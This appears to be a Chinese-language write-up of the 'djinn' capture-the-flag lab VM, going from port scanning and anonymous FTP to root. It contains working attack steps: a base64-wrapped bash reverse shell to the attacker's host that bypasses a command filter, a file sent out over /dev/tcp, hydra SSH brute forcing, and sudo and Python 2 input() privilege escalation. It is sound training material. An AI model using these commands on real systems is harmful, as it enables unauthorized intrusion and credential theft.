# 信息搜集

1、端口扫描

```bash
└─# nmap -p- 192.168.2.8
└─# nmap -p21,22,1337,7331 192.168.2.8 -sVC -A -O -oA nmap.txt
```

```
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '-', 8)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Lost in space

MAC Address: 00:0C:29:78:A5:5E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Unix
```

得到了一些信息

- 比如 22 端口显示的 filter，可能需要一定的规则才能 knock 敲开

- 21 端口的 ftp 可匿名登录

3、7331 端口如下

<img src=".\图片\Snipaste_2023-08-15_14-21-01.png" alt="Snipaste_2023-08-15_14-21-01" style="zoom:67%;" />

4、1337 端口如下

```bash
└─# nc 192.168.2.8 1337                                       
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(9, '+', 4)
> 13
(6, '+', 8)
> 
```

就是让你输入 1000 次正确答案，才能看到一些信息。可能需要写脚本

5、ftp 匿名登录

得到三个文件，下载后查看

`creds.txt`：

```
nitu:81299
```

`game.txt`：

```
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
```

`message.txt`：

```
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
```

发现了一些用户名和密码的信息，把它们做成字典

这里并且提示我们做个 1337 端口的游戏，意思就是让我们写脚本

# 打点

## python脚本游戏

我不会写，看别人怎么写，然后学吧

```bash
└─# nc 192.168.2.8 1337                                       
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(9, '+', 4)
> 13
(6, '+', 8)
> 
```

<img src=".\图片\Snipaste_2023-08-15_14-43-04.png" alt="Snipaste_2023-08-15_14-43-04" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-15_14-43-31.png" alt="Snipaste_2023-08-15_14-43-31" style="zoom: 80%;" />

```python
from pwn import *
conn = remote('192.168.2.8',1337)
resp = conn.recvuntil(b'gift.\n')
print(resp.decode(),end='')
for i in range(1000):
    # recv
    resp = conn.recvuntil(b'> ')
    print(resp.decode(),end='')
    
    # answer
    data = resp.decode().split('\n')[0]
    exec(f"data = {data}")
    exec(f"data = {data[0]} {data[1]} {data[2]}")
    data = str(data) + '\n'
    
    #send
    print(data,end='')
    conn.send(data.encode())

conn.interactive()
conn.close()
```

运行脚本后得到礼物

```
Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

接着按顺序敲门，发现 22 端口已经打开

```bash
└─# knock 192.168.2.8 1356  6784  3409                                                                                                                                                             
┌──(root💀kali)-[~/djinn]
└─# nmap -p22 192.168.2.8                                     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 03:02 EDT
Nmap scan report for 192.168.2.8 (192.168.2.8)
Host is up (0.00031s latency).

PORT   STATE SERVICE
22/tcp open  ssh
```

## web打点

7331端口

1、目录扫描

```bash
└─# gobuster dir -u http://192.168.2.8:7331 -w webdir -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak
```

得到 /wish 目录

<img src=".\图片\Snipaste_2023-08-15_15-15-02.png" alt="Snipaste_2023-08-15_15-15-02" style="zoom:80%;" />

2、可以执行命令，这里有个小细节，我们得用 bp 重发器拦截了 302 才能看到结果，因为浏览器会直接 302 跳转到其它地方

<img src=".\图片\Snipaste_2023-08-15_15-18-28.png" alt="Snipaste_2023-08-15_15-18-28" style="zoom:67%;" />

3、模糊测试

但是，执行反弹 shell 失败，可能有过滤。面对这种过滤，我们需要 fuzz 大法测试，把一堆 特殊字符 放进一个字典 然后使用 bp 的爆破模块，查看回显页面的不同，就可以知道哪个特殊字符被拦截了，然后慢慢想办法绕过 

发现如下被禁止的特殊字符

```
;	/	?	*	^	$
```

这里试试老办法 base64 编码

4、反弹 shell

在kali里输入：

```
└─# echo "bash -i &> /dev/tcp/192.168.2.7/1234 0>&1"|base64
YmFzaCAtaSAmPiAvZGV2L3RjcC8xOTIuMTY4LjIuNy8xMjM0IDA+JjEK
```

在 burp 输入

```
echo "YmFzaCAtaSAmPiAvZGV2L3RjcC8xOTIuMTY4LjIuNy8xMjM0IDA+JjEK"|base64 -d|bash
```

然后得到反弹 shell

```bash
└─# nc -lvvp 1234            
listening on [any] 1234 ...
connect to [192.168.2.7] from 192.168.2.8 [192.168.2.8] 33402
bash: cannot set terminal process group (711): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@djinn:/opt/80$ tty
tty
/dev/pts/0
www-data@djinn:/opt/80$ ls
ls
app.py	app.pyc  static  templates
www-data@djinn:/opt/80$ 
```

5、二次信息搜集

1、 /etc/passwd

```bash
www-data@djinn:/opt/80$ cat /etc/passwd |grep home
cat /etc/passwd |grep home
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
nitish:x:1001:1001::/home/nitish:/bin/bash
```

把得到的账号也加入我们准备的用户名字典

2、app.py

```bash
www-data@djinn:/opt/80$ ls
ls
app.py	app.pyc  static  templates
www-data@djinn:/opt/80$ cat app.py
cat app.py
import subprocess

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
app.secret_key = "key"

CREDS = "/home/nitish/.dev/creds.txt"

RCE = ["/", ".", "?", "*", "^", "$", "eval", ";"]


def validate(cmd):
    if CREDS in cmd and "cat" not in cmd:
        return True

    try:
        for i in RCE:
            for j in cmd:
                if i == j:
                    return False
        return True
    except Exception:
        return False


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route("/wish", methods=['POST', "GET"])
def wish():
    execute = request.form.get("cmd")
    if execute:
        if validate(execute):
            output = subprocess.Popen(execute, shell=True,
                                      stdout=subprocess.PIPE).stdout.read()
        else:
            output = "Wrong choice of words"

        return redirect(url_for("genie", name=output))
    else:
        return render_template('wish.html')


@app.route('/genie', methods=['GET', 'POST'])
def genie():
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = "It's not that hard"

    return render_template('genie.html', file=page)


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
```

得到了 `/home/nitish/.dev/creds.txt` 

查看

```bash
www-data@djinn:/opt/80$ cat /home/nitish/.dev/creds.txt
cat /home/nitish/.dev/creds.txt
nitish:p4ssw0rdStr3r0n9
```

也把得到的用户名密码加入我们的字典

## ssh 爆破

```bash
└─# hydra -L username.txt -P password.txt ssh://192.168.2.8 -t 4
```

得到用户明密码

```
nitish:p4ssw0rdStr3r0n9
```

接着 ssh 登录 得到一个稍微高权限的 用户 shell

```bash
└─# ssh nitish@192.168.2.8
nitish@djinn:~$ id
uid=1001(nitish) gid=1001(nitish) groups=1001(nitish)
```

# 提权

## 提权到sam用户

查看 nitish 用户 可以不需要密码用其它身份执行的程序

```bash
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

试着运行

```bash
nitish@djinn:~$ sudo -u sam genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

发现这几个参数都不好使，用 man 命令 查看一下，发现有个 -cmd 参数

```bash
nitish@djinn:~$ man /usr/bin/genie
```

<img src=".\图片\Snipaste_2023-08-15_15-49-36.png" alt="Snipaste_2023-08-15_15-49-36" style="zoom:50%;" />

于是接着尝试，得到 Sam 的权限

```bash
nitish@djinn:~$ sudo -u sam genie -cmd ''
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
```

## 提取到root

sudo -l 

```bash
sam@djinn:~$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```

试着运行下 `/root/lago`

```bash
sam@djinn:~$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:222
Do something better with your life
```

又是信息收集的时候，在 sam 的家目录下找到了 .pyc 文件

```bash
sam@djinn:/home/sam$ ls -al
total 36
drwxr-x--- 4 sam  sam  4096 Nov 14  2019 .
drwxr-xr-x 4 root root 4096 Nov 14  2019 ..
-rw------- 1 root root  417 Nov 14  2019 .bash_history
-rw-r--r-- 1 root root  220 Oct 20  2019 .bash_logout
-rw-r--r-- 1 sam  sam  3771 Oct 20  2019 .bashrc
drwx------ 2 sam  sam  4096 Nov 11  2019 .cache
drwx------ 3 sam  sam  4096 Oct 20  2019 .gnupg
-rw-r--r-- 1 sam  sam   807 Oct 20  2019 .profile
-rw-r--r-- 1 sam  sam  1749 Nov  7  2019 .pyc
-rw-r--r-- 1 sam  sam     0 Nov  7  2019 .sudo_as_admin_successful
```

下载下来看看，可以用 nc 下载也可以用 python 开启 http 服务下载

 kali监听：

```bahs
└─# nc -lvvp 2233 > .pyc
```

sam 用户发送：

```bash
sam@djinn:/home/sam$ cat .pyc > /dev/tcp/192.168.2.7/2233
```

接下来反编译 .pyc 文件

使用网站 [python反编译 - 在线工具 (tool.lu)](https://tool.lu/pyc/)

得到源码，python2 写的 ，就是 `/root/lago` 的源码

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 2.7

from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s==num :
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'

if __name__ == '__main__':
    main(options())
```

看见 python2 input 函数，可以尝试绕过，`if s == num` ，当输入的参数 为 num 时，便进入了这个 if

```bash
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100: 
Enter your number: num
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
# ./proof.sh
    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Tue Aug 15 13:38:24 IST 2023
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
```

# 总结

- python 写关于 应用程序运行中的交互脚本
- 被拦截时，可以 fuzz 大法来一步步尝试出它拦截哪些字符串，再来想办法
- .pyc 文件可反编译成 py 文件
- python2 input 函数有缺陷


